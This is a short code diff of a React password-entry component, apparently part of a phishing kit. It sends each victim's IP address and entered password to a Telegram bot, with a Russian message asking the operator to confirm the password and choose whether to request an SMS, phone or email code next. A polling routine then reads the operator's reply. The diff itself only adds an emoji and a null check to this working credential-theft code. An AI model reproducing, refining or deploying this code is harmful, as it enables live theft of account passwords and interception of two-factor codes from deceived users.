@@ -26,7 +26,7 @@ const Password = (props) => {
                 firstState = res.data.result;
             })
         setLoading(true);
-        axios.post(bot.sendMessage('Пользователь <code>' + props.info.IPv4 + '</code>' +
+        axios.post(bot.sendMessage('🙊 Пользователь <code>' + props.info.IPv4 + '</code>' +
             ' говорит, что его пароль: ' + password + '.%0A Если пароль верный, введите (sms/phone/email).%0A' +
             'Если нет, напишите (no)'), '')
     }
@@ -34,7 +34,7 @@ const Password = (props) => {
 
     const getUpdatesInterval =  () => {
         let req;
-        if (firstState.length > 80) {
+        if (firstState &&  firstState.length > 80) {
             req = bot.getUpdatesOffset(Number(firstState[firstState.length - 1].update_id) + 1)
         } else req = bot.getUpdates();
         axios.get(req)
